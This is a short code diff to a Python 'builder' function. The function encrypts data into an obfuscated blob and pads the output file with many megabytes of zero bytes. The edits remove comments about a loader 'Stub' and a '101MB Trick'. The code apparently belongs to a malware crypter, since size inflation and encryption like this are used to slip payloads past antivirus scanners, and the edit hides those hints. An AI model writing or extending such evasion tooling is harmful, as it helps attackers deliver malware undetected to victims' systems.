@@ -28,12 +28,10 @@ def builder():
     encrypted_data = cipher.encrypt(original_data)
 
     # 2. Add Execution Delay & Key to the final file
-    # Note: In a real scenario, you'd use a 'Stub' to read this, 
-    # but for this task, we are creating the obfuscated blob.
     with open(args.output, "wb") as f:
         f.write(encrypted_data)
 
-    # 3. File Size Manipulation (The 101MB Trick)
+    # 3. File Size Manipulation
     if args.add_size:
         print(f"[*] Inflating file by {args.add_size}MB...")
         padding = b"\x00" * (1024 * 1024 * args.add_size)
